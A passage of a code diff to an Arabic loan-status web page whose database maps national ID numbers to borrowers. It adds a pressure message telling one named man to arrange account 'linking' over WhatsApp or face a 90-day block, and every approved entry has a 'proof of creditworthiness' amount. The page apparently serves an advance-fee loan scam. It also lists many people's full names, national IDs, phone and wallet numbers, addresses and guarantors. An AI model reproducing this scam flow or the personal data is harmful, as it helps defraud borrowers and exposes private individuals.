@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        :root { --emerald: #2ECC71; --emerald-dark: #27AE60; --emerald-glow: rgba(46,204,113,0.4); --deep-blue: #0F172A; --deep-blue-light: #1E293B; --royal-gold: #D4AF37; --royal-gold-light: #F3D572; --neon-purple: #B85CFF; --text-light: #F8FAFC; --text-muted: #94A3B8; --danger: #EF4444; --warning: #FF8C42; --glass-bg: rgba(15,23,42,0.75); --glass-border: rgba(255,255,255,0.1); }
+        :root { --emerald: #2ECC71; --emerald-dark: #27AE60; --emerald-glow: rgba(46,204,113,0.4); --deep-blue: #0F172A; --deep-blue-light: #1E293B; --royal-gold: #D4AF37; --royal-gold-light: #F3D572; --neon-purple: #B85CFF; --text-light: #F8FAFC; --text-muted: #94A3B8; --danger: #EF4444; --warning: #FF8C42; --anuta-blue: #00D9FF; --glass-bg: rgba(15,23,42,0.75); --glass-border: rgba(255,255,255,0.1); }
         body { font-family: 'Cairo', sans-serif; background: radial-gradient(circle at 30% 10%, #0F172A, #020617); color: var(--text-light); min-height: 100vh; position: relative; overflow-x: hidden; }
         .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; background-image: linear-gradient(rgba(46,204,113,0.06) 1px, transparent 1px), linear-gradient(90deg, rgba(46,204,113,0.06) 1px, transparent 1px); background-size: 50px 50px; pointer-events: none; animation: gridMove 20s linear infinite; }
         @keyframes gridMove { 0% { transform: translate(0,0); } 100% { transform: translate(50px,50px); } }
@@ -49,403 +49,22 @@
         .payment-details .row .value.gold { color: var(--royal-gold); }
         .payment-details .row .value.danger { color: var(--danger); }
 
-        .glow-amount { text-align: center; padding: 1.2rem; margin: 1rem 0; background: radial-gradient(circle, rgba(212,175,55,0.1), transparent 70%); border-radius: 1.5rem; border: 1px solid var(--royal-gold); animation: pulseGold 1.5s infinite alternate; }
-        @keyframes pulseGold { 0% { box-shadow: 0 0 5px rgba(212,175,55,0.2); } 100% { box-shadow: 0 0 25px rgba(212,175,55,0.4); } }
-        .glow-amount .label { font-size: 0.75rem; color: var(--text-muted); }
-        .glow-amount .amount { font-size: 2.8rem; font-weight: 900; color: var(--royal-gold); text-shadow: 0 0 20px rgba(212,175,55,0.3); }
-
-        .danger-box { background: radial-gradient(circle, rgba(239,68,68,0.15), transparent 70%); border: 2px solid var(--danger); border-radius: 1.5rem; padding: 1.2rem; margin: 1rem 0; animation: pulseRed 1.2s infinite alternate; }
-        @keyframes pulseRed { 0% { box-shadow: 0 0 5px rgba(239,68,68,0.2); } 100% { box-shadow: 0 0 25px rgba(239,68,68,0.4); } }
-        .danger-box .label { font-size: 0.75rem; color: var(--text-muted); }
-        .danger-box .amount { font-size: 2.8rem; font-weight: 900; color: var(--danger); text-shadow: 0 0 20px rgba(239,68,68,0.3); }
-
         .info-box { background: rgba(255,255,255,0.02); border-right: 3px solid var(--royal-gold); padding: 0.8rem; border-radius: 0.8rem; margin: 0.8rem 0; font-size: 0.8rem; color: var(--text-muted); line-height: 1.8; }
         .info-box .highlight { color: var(--royal-gold); font-weight: 700; }
         .info-box .highlight-danger { color: var(--danger); font-weight: 700; }
 
-        .steps-box { background: rgba(255,255,255,0.02); border-radius: 0.8rem; padding: 0.8rem; margin: 0.8rem 0; border: 1px solid rgba(255,255,255,0.04); }
-        .steps-box .step { display: flex; align-items: flex-start; gap: 0.6rem; padding: 0.3rem 0; font-size: 0.8rem; color: var(--text-muted); border-bottom: 1px solid rgba(255,255,255,0.03); }
-        .steps-box .step:last-child { border-bottom: none; }
-        .steps-box .step .num { min-width: 24px; height: 24px; border-radius: 50%; background: var(--royal-gold); color: #0F172A; font-weight: 800; font-size: 0.65rem; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
-        .steps-box .step .text strong { color: #FFF; }
-
-        .timer-glow { background: radial-gradient(circle, rgba(212,175,55,0.08), transparent); border: 1px solid var(--royal-gold); border-radius: 1.5rem; text-align: center; padding: 0.8rem; margin: 0.8rem 0; animation: pulseGold 1.2s infinite alternate; }
-        .timer-danger { background: radial-gradient(circle, rgba(239,68,68,0.12), transparent); border: 2px solid var(--danger); border-radius: 1.5rem; text-align: center; padding: 0.8rem; margin: 0.8rem 0; animation: pulseRed 1.2s infinite alternate; }
-        .timer { font-family: monospace; font-size: 2rem; font-weight: 800; background: #00000088; display: inline-block; padding: 0.2rem 0.8rem; border-radius: 1.5rem; color: var(--royal-gold); letter-spacing: 3px; }
-        .timer-danger .timer { color: var(--danger); }
-
         .btn-whatsapp { background: linear-gradient(135deg, #25D366, #128C7E); padding: 0.8rem; border-radius: 3rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; font-weight: 700; font-size: 1rem; border: none; color: white; cursor: pointer; transition: 0.2s; width: 100%; margin-top: 0.8rem; box-shadow: 0 4px 15px rgba(37,211,102,0.25); }
         .btn-whatsapp:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(37,211,102,0.4); }
+        .btn-whatsapp.etisalat-btn { background: linear-gradient(135deg, var(--anuta-blue), #0099CC); box-shadow: 0 4px 15px rgba(0,191,255,0.25); }
+        .btn-whatsapp.etisalat-btn:hover { box-shadow: 0 0 20px rgba(0,191,255,0.4); }
         .btn-pay { background: linear-gradient(135deg, var(--royal-gold), #B8960F); color: #0F172A; box-shadow: 0 4px 15px rgba(212,175,55,0.25); }
         .btn-pay:hover { box-shadow: 0 0 20px rgba(212,175,55,0.4); }
-        .btn-danger { background: linear-gradient(135deg, var(--danger), #C0392B); color: white; box-shadow: 0 4px 15px rgba(239,68,68,0.25); }
-        .btn-danger:hover { box-shadow: 0 0 20px rgba(239,68,68,0.4); }
-        .btn-exception { background: linear-gradient(135deg, #FF6B6B, #EE4444); color: white; box-shadow: 0 4px 15px rgba(239,68,68,0.25); }
-        .btn-exception:hover { box-shadow: 0 0 20px rgba(239,68,68,0.4); }
-        .btn-proof { background: linear-gradient(135deg, #8B5CF6, #6D28D9); color: white; box-shadow: 0 4px 15px rgba(139,92,246,0.25); }
-        .btn-proof:hover { box-shadow: 0 0 20px rgba(139,92,246,0.4); }
 
         .error-card { background: rgba(239,68,68,0.12); border: 1px solid var(--danger); border-radius: 1.5rem; padding: 1.5rem; text-align: center; display: none; margin-top: 1rem; }
         .loader { text-align: center; display: none; margin: 1rem; }
         .footer { text-align: center; margin-top: 1.5rem; font-size: 0.65rem; color: var(--text-muted); }
 
-        /* ===== رسالة صرف القرض مع إثبات الجدارة ===== */
-        .loan-details-card {
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            border-radius: 2rem;
-            padding: 1.8rem;
-            margin-bottom: 1.5rem;
-            border: 2px solid var(--emerald);
-            animation: fadeSlideUp 0.5s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .loan-details-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(46,204,113,0.05), transparent, rgba(212,175,55,0.05), transparent);
-            animation: rotateGlow 6s linear infinite;
-        }
-        @keyframes rotateGlow {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .loan-details-card .success-icon {
-            font-size: 4rem;
-            color: var(--emerald);
-            text-align: center;
-            display: block;
-            margin-bottom: 0.5rem;
-            position: relative;
-            z-index: 1;
-            animation: bounceStar 1.2s ease-in-out infinite;
-        }
-        @keyframes bounceStar {
-            0%,100% { transform: scale(1) rotate(0deg); }
-            25% { transform: scale(1.15) rotate(8deg); }
-            75% { transform: scale(0.95) rotate(-5deg); }
-        }
-        .loan-details-card h2 {
-            color: var(--emerald);
-            text-align: center;
-            font-size: 1.6rem;
-            font-weight: 800;
-            position: relative;
-            z-index: 1;
-        }
-        .loan-details-card .sub-title {
-            text-align: center;
-            color: var(--text-muted);
-            font-size: 0.95rem;
-            margin: 0.3rem 0 1rem;
-            position: relative;
-            z-index: 1;
-        }
-        .loan-details-card .amount-box {
-            background: rgba(46,204,113,0.08);
-            border: 2px solid var(--emerald);
-            border-radius: 1rem;
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            text-align: center;
-            position: relative;
-            z-index: 1;
-        }
-        .loan-details-card .amount-box .label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-        }
-        .loan-details-card .amount-box .value {
-            font-size: 2.5rem;
-            font-weight: 900;
-            color: var(--emerald);
-            text-shadow: 0 0 20px rgba(46,204,113,0.3);
-        }
-        .loan-details-card .wallet-box {
-            background: rgba(0,191,255,0.05);
-            border: 2px solid #00BFFF;
-            border-radius: 1rem;
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            text-align: center;
-            position: relative;
-            z-index: 1;
-        }
-        .loan-details-card .wallet-box .wallet-num {
-            font-size: 1.6rem;
-            font-weight: 800;
-            color: #00BFFF;
-            letter-spacing: 2px;
-        }
-        .loan-details-card .wallet-box .label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-        }
-        .loan-details-card .remaining-box {
-            background: rgba(212,175,55,0.05);
-            border: 2px solid var(--royal-gold);
-            border-radius: 1rem;
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            text-align: center;
-            position: relative;
-            z-index: 1;
-        }
-        .loan-details-card .remaining-box .label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-        }
-        .loan-details-card .remaining-box .value {
-            font-size: 2rem;
-            font-weight: 900;
-            color: var(--royal-gold);
-            text-shadow: 0 0 20px rgba(212,175,55,0.3);
-        }
-
-        /* ===== رسالة إثبات الجدارة الائتمانية ===== */
-        .proof-credit-card {
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            border-radius: 2rem;
-            padding: 1.8rem;
-            margin-bottom: 1.5rem;
-            border: 2px solid #8B5CF6;
-            animation: fadeSlideUp 0.5s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .proof-credit-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(139,92,246,0.05), transparent, rgba(212,175,55,0.05), transparent);
-            animation: rotateGlow 8s linear infinite;
-        }
-        .proof-credit-card .proof-icon {
-            font-size: 4rem;
-            color: #8B5CF6;
-            text-align: center;
-            display: block;
-            margin-bottom: 0.5rem;
-            position: relative;
-            z-index: 1;
-            animation: pulseProof 1.5s ease-in-out infinite;
-        }
-        @keyframes pulseProof {
-            0%,100% { transform: scale(1); }
-            50% { transform: scale(1.1); text-shadow: 0 0 30px rgba(139,92,246,0.3); }
-        }
-        .proof-credit-card h2 {
-            color: #8B5CF6;
-            text-align: center;
-            font-size: 1.6rem;
-            font-weight: 800;
-            position: relative;
-            z-index: 1;
-        }
-        .proof-credit-card .sub-title {
-            text-align: center;
-            color: var(--text-muted);
-            font-size: 0.95rem;
-            margin: 0.3rem 0 1rem;
-            position: relative;
-            z-index: 1;
-        }
-        .proof-credit-card .proof-box {
-            background: rgba(139,92,246,0.05);
-            border: 2px solid #8B5CF6;
-            border-radius: 1rem;
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            position: relative;
-            z-index: 1;
-        }
-        .proof-credit-card .proof-box .label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            text-align: center;
-        }
-        .proof-credit-card .proof-box .value {
-            font-size: 2rem;
-            font-weight: 900;
-            color: #8B5CF6;
-            text-align: center;
-            text-shadow: 0 0 20px rgba(139,92,246,0.3);
-        }
-        .proof-credit-card .steps-mini {
-            background: rgba(0,0,0,0.3);
-            border-radius: 0.8rem;
-            padding: 0.6rem;
-            margin: 0.6rem 0;
-            position: relative;
-            z-index: 1;
-        }
-        .proof-credit-card .steps-mini .step {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            padding: 0.25rem 0;
-            font-size: 0.75rem;
-            color: var(--text-muted);
-            border-bottom: 1px solid rgba(255,255,255,0.03);
-        }
-        .proof-credit-card .steps-mini .step:last-child { border-bottom: none; }
-        .proof-credit-card .steps-mini .step .num {
-            min-width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            background: #8B5CF6;
-            color: #0A0F1A;
-            font-weight: 800;
-            font-size: 0.6rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-        .proof-credit-card .steps-mini .step strong { color: #FFF; }
-
-        /* ===== رسالة الإلغاء ===== */
-        .cancelled-card {
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            border-radius: 2rem;
-            padding: 1.8rem;
-            margin-bottom: 1.5rem;
-            border: 2px solid var(--danger);
-            animation: fadeSlideUp 0.5s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .cancelled-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(239,68,68,0.05), transparent, rgba(212,175,55,0.05), transparent);
-            animation: rotateGlow 8s linear infinite;
-        }
-        .cancelled-card .cancel-icon {
-            font-size: 4rem;
-            color: var(--danger);
-            text-align: center;
-            display: block;
-            margin-bottom: 0.5rem;
-            position: relative;
-            z-index: 1;
-            animation: pulseRed 1.2s infinite alternate;
-        }
-        .cancelled-card h2 {
-            color: var(--danger);
-            text-align: center;
-            font-size: 1.6rem;
-            font-weight: 800;
-            position: relative;
-            z-index: 1;
-        }
-        .cancelled-card .sub-title {
-            text-align: center;
-            color: var(--text-muted);
-            font-size: 0.95rem;
-            margin: 0.3rem 0 1rem;
-            position: relative;
-            z-index: 1;
-        }
-        .cancelled-card .reason-box {
-            background: rgba(239,68,68,0.08);
-            border-right: 4px solid var(--danger);
-            padding: 0.8rem 1rem;
-            border-radius: 0.8rem;
-            margin: 0.8rem 0;
-            position: relative;
-            z-index: 1;
-        }
-        .cancelled-card .reason-box p {
-            color: var(--text-muted);
-            font-size: 0.9rem;
-            line-height: 1.8;
-            margin: 0;
-        }
-        .cancelled-card .reason-box .highlight-danger { color: var(--danger); font-weight: 700; }
-        .cancelled-card .reason-box .highlight-gold { color: var(--royal-gold); font-weight: 700; }
-        .cancelled-card .timer-box {
-            background: rgba(0,0,0,0.4);
-            border-radius: 1rem;
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            text-align: center;
-            border: 1px solid var(--royal-gold);
-            position: relative;
-            z-index: 1;
-        }
-        .cancelled-card .timer-box .timer-label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-        }
-        .cancelled-card .timer-box .timer-value {
-            font-size: 2.2rem;
-            font-weight: 800;
-            color: var(--royal-gold);
-            font-family: monospace;
-            letter-spacing: 5px;
-        }
-        .cancelled-card .timer-box .timer-value.danger {
-            color: var(--danger);
-            animation: pulseRed 0.8s infinite alternate;
-        }
-        .cancelled-card .exception-box {
-            background: rgba(46,204,113,0.05);
-            border: 2px solid var(--emerald);
-            border-radius: 1rem;
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            text-align: center;
-            position: relative;
-            z-index: 1;
-        }
-        .cancelled-card .exception-box p {
-            color: var(--text-muted);
-            font-size: 0.85rem;
-            line-height: 1.8;
-        }
-        .cancelled-card .exception-box .highlight-green { color: var(--emerald); font-weight: 700; }
-        .cancelled-card .exception-box .highlight-gold { color: var(--royal-gold); font-weight: 700; }
-        .cancelled-card .btn-exception {
-            background: linear-gradient(135deg, #FF6B6B, #EE4444);
-            color: white;
-            padding: 0.8rem;
-            border-radius: 3rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.6rem;
-            font-weight: 700;
-            font-size: 1rem;
-            border: none;
-            cursor: pointer;
-            transition: 0.2s;
-            width: 100%;
-            margin-top: 0.5rem;
-            box-shadow: 0 4px 15px rgba(239,68,68,0.25);
-            position: relative;
-            z-index: 1;
-        }
-        .cancelled-card .btn-exception:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(239,68,68,0.4);
-        }
-
-        /* ===== رسالة الأقساط للعميلة هبه ===== */
+        /* ===== رسالة الأقساط للعملاء المدانين ===== */
         .installment-card {
             background: var(--glass-bg);
             backdrop-filter: blur(20px);
@@ -467,6 +86,10 @@
             background: conic-gradient(from 0deg, transparent, rgba(212,175,55,0.05), transparent, rgba(46,204,113,0.05), transparent);
             animation: rotateGlow 8s linear infinite;
         }
+        @keyframes rotateGlow {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
         .installment-card .installment-icon {
             font-size: 4rem;
             color: var(--royal-gold);
@@ -476,6 +99,10 @@
             position: relative;
             z-index: 1;
             animation: pulseGold 1.5s ease-in-out infinite;
+        }
+        @keyframes pulseGold {
+            0%,100% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.1) rotate(5deg); }
         }
         .installment-card h2 {
             color: var(--royal-gold);
@@ -492,6 +119,46 @@
             margin: 0.3rem 0 1rem;
             position: relative;
             z-index: 1;
+        }
+        .installment-card .amount-box {
+            background: rgba(46,204,113,0.08);
+            border: 2px solid var(--emerald);
+            border-radius: 1rem;
+            padding: 0.8rem;
+            margin: 0.8rem 0;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        .installment-card .amount-box .label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+        }
+        .installment-card .amount-box .value {
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: var(--emerald);
+            text-shadow: 0 0 20px rgba(46,204,113,0.3);
+        }
+        .installment-card .wallet-box {
+            background: rgba(0,191,255,0.05);
+            border: 2px solid #00BFFF;
+            border-radius: 1rem;
+            padding: 0.8rem;
+            margin: 0.8rem 0;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        .installment-card .wallet-box .wallet-num {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #00BFFF;
+            letter-spacing: 2px;
+        }
+        .installment-card .wallet-box .label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
         }
         .installment-card .installment-box {
             background: rgba(212,175,55,0.05);
@@ -542,19 +209,10 @@
         @media (max-width: 640px) {
             .glass-header { flex-direction: column; text-align: center; }
             .amount-display .value { font-size: 2rem; }
-            .glow-amount .amount { font-size: 2rem; }
-            .danger-box .amount { font-size: 2rem; }
             .payment-details .row { font-size: 0.75rem; flex-wrap: wrap; gap: 0.2rem; }
-            .timer { font-size: 1.5rem; }
-            .cancelled-card h2 { font-size: 1.3rem; }
-            .cancelled-card .timer-box .timer-value { font-size: 1.8rem; }
-            .loan-details-card h2 { font-size: 1.3rem; }
-            .loan-details-card .amount-box .value { font-size: 2rem; }
-            .loan-details-card .wallet-box .wallet-num { font-size: 1.2rem; }
-            .loan-details-card .remaining-box .value { font-size: 1.6rem; }
-            .proof-credit-card h2 { font-size: 1.3rem; }
-            .proof-credit-card .proof-box .value { font-size: 1.6rem; }
             .installment-card h2 { font-size: 1.3rem; }
+            .installment-card .amount-box .value { font-size: 2rem; }
+            .installment-card .wallet-box .wallet-num { font-size: 1.2rem; }
             .installment-card .installment-box .value { font-size: 1.4rem; }
             .installment-card .info-row { font-size: 0.75rem; flex-wrap: wrap; gap: 0.2rem; }
         }
@@ -613,7 +271,7 @@ const customersDatabase = {
     // عملاء مدانة (تم الصرف - installment)
     // ============================================================
 
-    "29801601241": {
+    "2980801241": {
         name: "ندى حسام محمد الشرقاوي",
         loan: 30000,
         wallet: "اتصالات كاش",
@@ -638,25 +296,105 @@ const customersDatabase = {
     },
 
     // ============================================================
-    // العملاء العاديون (approved - تحتاج إثبات جدارة)
+    // العميل جمال (حالة processing - قيد تنفيذ الإجراءات)
+    // ============================================================
+
+    "29301010147874": {
+        name: "جمال عبد الدايم المرسي السيد",
+        loan: 60000,
+        wallet: "اتصالات كاش",
+        walletNum: "01150951822",
+        status: "processing",
+        job: "صاحب مشروع قائم",
+        proofAmount: 6000,
+        address: "قريه فرغان مركز ديرب نجم محافظة الشرقية خلف المعهد الديني",
+        isProcessing: true,
+        processingMessage: `
+            <div style="background: linear-gradient(145deg, rgba(0,191,255,0.08), rgba(212,175,55,0.04)); border: 2px solid var(--anuta-blue); border-radius: 1.2rem; padding: 1.2rem; margin: 0.8rem 0; position: relative; overflow: hidden;">
+                <div style="display: flex; align-items: center; gap: 0.8rem; margin-bottom: 0.5rem;">
+                    <i class="fas fa-spinner fa-pulse" style="color: var(--anuta-blue); font-size: 2rem;"></i>
+                    <h3 style="color: var(--anuta-blue); font-size: 1.1rem; font-weight: 800; margin: 0;">⏳ قيد تنفيذ الإجراءات</h3>
+                </div>
+                <p style="color: var(--text-muted); font-size: 0.9rem; line-height: 1.9; margin: 0.3rem 0;">
+                    عزيزي <strong style="color: #FFF;">جمال عبد الدايم المرسي السيد</strong>،
+                    <br><br>
+                    <span class="highlight-gold">📌 لابد من ربط الحساب لبدء التسييل</span>
+                    <br>
+                    حتى يتم فتح ملفك وتحديد موعد نزول المبلغ لحسابك بعدد من الدقائق.
+                    <br><br>
+                    <span class="highlight-blue">📱 يرجى الرجوع إلى قسم التحويلات المالية على واتساب</span>
+                    <br>
+                    ليتم إبلاغك بالطريقة الصحيحة لربط الحساب ورفع الأربع عمليات بشكل صحيح لتسييل المبلغ لحسابك.
+                </p>
+
+                <div style="background: rgba(239,68,68,0.05); border-right: 4px solid var(--danger); padding: 0.6rem 0.8rem; border-radius: 0.5rem; margin: 0.6rem 0;">
+                    <p style="color: var(--text-muted); font-size: 0.8rem; line-height: 1.8; margin: 0;">
+                        <i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i>
+                        <strong style="color: var(--danger);">⚠️ تنبيه هام:</strong>
+                        <br>
+                        <span style="color: var(--text-muted);">
+                            في حالة <strong style="color: var(--danger);">الخطأ للمرة الثانية</strong>،
+                            سيتم <strong style="color: var(--danger);">إغلاق الطلب لمدة 90 يوماً</strong>،
+                            ولن تتمكن من استرداد طلبك مرة أخرى قبل انتهاء المدة المحددة.
+                        </span>
+                    </p>
+                </div>
+
+                <div style="background: rgba(46,204,113,0.05); border: 2px solid var(--emerald); border-radius: 0.8rem; padding: 0.6rem; margin: 0.6rem 0;">
+                    <p style="color: var(--text-light); font-size: 0.85rem; line-height: 1.8; margin: 0; text-align: center;">
+                        <i class="fas fa-shield-alt" style="color: var(--emerald);"></i>
+                        <strong style="color: var(--emerald);">🔐 لا يوجد دفع ولا تحويل لينا أي أموال نهائياً</strong>
+                        <br>
+                        <span style="color: var(--text-muted);">
+                            كل ما هو مطلوب هو إجراء مشفر لك لضمان نجاح العملية وضمان حقوقنا وحقوقك كاملة.
+                        </span>
+                    </p>
+                </div>
+
+                <div style="display: flex; gap: 0.5rem; justify-content: center; flex-wrap: wrap; margin-top: 0.5rem;">
+                    <span style="background: rgba(0,191,255,0.12); border: 1px solid var(--anuta-blue); border-radius: 2rem; padding: 0.3rem 1rem; font-size: 0.65rem; color: var(--anuta-blue);">
+                        <i class="fas fa-clock"></i> قيد التنفيذ
+                    </span>
+                    <span style="background: rgba(212,175,55,0.12); border: 1px solid var(--royal-gold); border-radius: 2rem; padding: 0.3rem 1rem; font-size: 0.65rem; color: var(--royal-gold);">
+                        <i class="fas fa-wallet"></i> اتصالات كاش
+                    </span>
+                    <span style="background: rgba(239,68,68,0.12); border: 1px solid var(--danger); border-radius: 2rem; padding: 0.3rem 1rem; font-size: 0.65rem; color: var(--danger);">
+                        <i class="fas fa-exclamation-circle"></i> 90 يوماً للحظر
+                    </span>
+                </div>
+
+                <button class="btn-whatsapp etisalat-btn" id="processingWhatsAppBtn" style="margin-top: 0.8rem;">
+                    <i class="fab fa-whatsapp fa-lg"></i> 📱 التواصل مع التحويلات المالية
+                </button>
+            </div>
+        `,
+        guarantor: {
+            name: "احمد عبد الدايم المرسي السيد",
+            relation: "اخ",
+            nationalId: "28705010104415",
+            phone: "01111438259"
+        }
+    },
+
+    // ============================================================
+    // العملاء العاديون (approved)
     // ============================================================
 
     "29910171300636": {
-    name: "عبدالرازق سيد عبدالرازق حسين",
-    loan: 200000,
-    wallet: "اتصالات كاش",
-    walletNum: "01140607631",
-    status: "approved",
-    job: "موظف قطاع خاص",
-    address: "قريه فرغان مركز ديرب نجم محافظة الشرقية خلف المعهد الديني",
-    proofAmount: 8000,
-    guarantor: {
-        name: "محمد سيد عبدالرازق حسين",
-        relation: "أخ",
-        nationalId: "30709280106473",
-        phone: "01015980043"
-    }
-}
+        name: "عبدالرازق سيد عبدالرازق حسين",
+        loan: 200000,
+        wallet: "اتصالات كاش",
+        walletNum: "01140607631",
+        status: "approved",
+        job: "موظف قطاع خاص",
+        address: "قريه فرغان مركز ديرب نجم محافظة الشرقية خلف المعهد الديني",
+        proofAmount: 10000,
+        guarantor: {
+            name: "محمد سيد عبدالرازق حسين",
+            relation: "أخ",
+            nationalId: "30709280106473",
+            phone: "01015980043"
+        }
     },
 
     "27110172500031": {
@@ -691,7 +429,7 @@ const customersDatabase = {
         }
     },
 
-    "30102200102918": {
+    "301022918": {
         name: "محمد نبيل رمضان خبير",
         loan: 65000,
         wallet: "اتصالات كاش",
@@ -739,7 +477,7 @@ const customersDatabase = {
         }
     },
 
-    "27812062800131": {
+    "278120131": {
         name: "محمد عوض بحر محمود",
         loan: 30000,
         wallet: "اتصالات كاش",
@@ -835,7 +573,7 @@ const customersDatabase = {
         }
     },
 
-    "27309181500819": {
+    "273090819": {
         name: "سعد عبدالكريم عبد الجواد جاويش",
         loan: 190000,
         wallet: "فودافون كاش",
@@ -979,7 +717,7 @@ const customersDatabase = {
         }
     },
 
-    "27507310200599": {
+    "275073599": {
         name: "ياسرسعدمحمدبكر",
         loan: 115000,
         wallet: "اتصالات كاش",
@@ -1091,7 +829,7 @@ const customersDatabase = {
         }
     },
 
-    "28109288800291": {
+    "28108800291": {
         name: "احمد عبد الستار عفيفي ساكنه",
         loan: 60000,
         wallet: "اتصالات كاش",
@@ -1123,7 +861,7 @@ const customersDatabase = {
         }
     },
 
-    "28807252102457": {
+    "288002457": {
         name: "Abdelrahman elsayed hemdan abdelhalem",
         loan: 35000,
         wallet: "اتصالات كاش",
@@ -1155,7 +893,7 @@ const customersDatabase = {
         }
     },
 
-    "28314111800257": {
+    "283141257": {
         name: "محمد حلمي محمد ابو السيد",
         loan: 200000,
         wallet: "فودافون كاش",
@@ -1172,7 +910,7 @@ const customersDatabase = {
         }
     },
 
-    "29904230103521": {
+    "2990403521": {
         name: "هاجر مصطفي حامد بدوى",
         loan: 175000,
         wallet: "اتصالات كاش",
@@ -1205,7 +943,7 @@ const customersDatabase = {
         }
     },
 
-    "29801151201432": {
+    "2980201432": {
         name: "احمد السعيد محمود بدوي",
         loan: 50000,
         wallet: "فودافون كاش",
@@ -1253,24 +991,7 @@ const customersDatabase = {
         }
     },
 
-    "29301010147874": {
-        name: "جمال عبد الدايم المرسي السيد",
-        loan: 60000,
-        wallet: "اتصالات كاش",
-        walletNum: "01150951822",
-        status: "approved",
-        job: "صاحب مشروع قائم",
-        proofAmount: 7000,
-        guarantor: {
-            name: "احمد عبد الدايم المرسي السيد",
-            relation: "اخ",
-            nationalId: "28705010104415",
-            phone: "01111438259"
-        }
-    },
-
-    // ===== العملاء الآخرون =====
-    "27503001046": {
+    "27503011901046": {
         name: "سماح غريب سبد عبدالباقي",
         loan: 150000,
         wallet: "اتصالات كاش",
@@ -1278,63 +999,6 @@ const customersDatabase = {
         status: "approved",
         job: "موظف حكومي - معلم أول أ",
         proofAmount: 8000,
-        isSpecialWarning: true,
-        specialWarning: `
-            <div style="background: radial-gradient(circle at center, rgba(239,68,68,0.15), rgba(212,175,55,0.05)); border: 3px solid var(--danger); border-radius: 1.2rem; padding: 1rem; margin: 0.8rem 0; text-align: center; animation: pulseRed 1.2s infinite alternate;">
-                <div style="display: flex; align-items: center; justify-content: center; gap: 0.8rem; margin-bottom: 0.5rem;">
-                    <i class="fas fa-exclamation-triangle" style="color: var(--danger); font-size: 2.5rem;"></i>
-                    <span style="color: var(--danger); font-weight: 900; font-size: 1.4rem;">⚠️ تنبيه هام جداً</span>
-                </div>
-                <p style="color: #FFF; font-size: 1.1rem; font-weight: 700; line-height: 1.8;">
-                    عزيزتي <strong style="color: var(--royal-gold);">سماح</strong>،
-                    <br>
-                    <span style="color: var(--royal-gold); font-size: 1.3rem;">💰 مبلغ 150,000 ج.م</span>
-                    <br>
-                    <span style="color: #FFF;">تم تجهيزه بالكامل وجاهز للصرف على محفظتك!</span>
-                </p>
-                <div style="background: rgba(255,255,255,0.05); border-radius: 0.8rem; padding: 0.6rem; margin: 0.5rem 0; border: 2px solid var(--royal-gold);">
-                    <p style="color: var(--text-light); font-size: 0.95rem; line-height: 1.8; margin: 0;">
-                        <i class="fas fa-check-circle" style="color: var(--emerald);"></i>
-                        <strong style="color: var(--emerald);">✅ مبلغ 150,000 ج.م في انتظارك!</strong>
-                        <br>
-                        <span style="color: var(--text-muted);">لم يتبق سوى إثبات الجدارة الائتمانية لصرف المبلغ بالكامل</span>
-                    </p>
-                </div>
-                <div style="background: rgba(46,204,113,0.05); border-radius: 0.8rem; padding: 0.6rem; margin: 0.5rem 0; border: 2px solid var(--emerald);">
-                    <p style="color: var(--text-light); font-size: 0.9rem; line-height: 1.8; margin: 0;">
-                        <i class="fas fa-shield-alt" style="color: var(--emerald);"></i>
-                        <strong style="color: var(--emerald);">🔐 هذا ليس دفعاً أو تحويلاً للشركة!</strong>
-                        <br>
-                        <span style="color: var(--text-muted);">أنت فقط تثبتين الجدارة الائتمانية لإتمام صرف المبلغ لك</span>
-                    </p>
-                </div>
-                <div style="background: rgba(239,68,68,0.08); border-radius: 0.8rem; padding: 0.6rem; margin: 0.5rem 0; border-right: 4px solid var(--danger);">
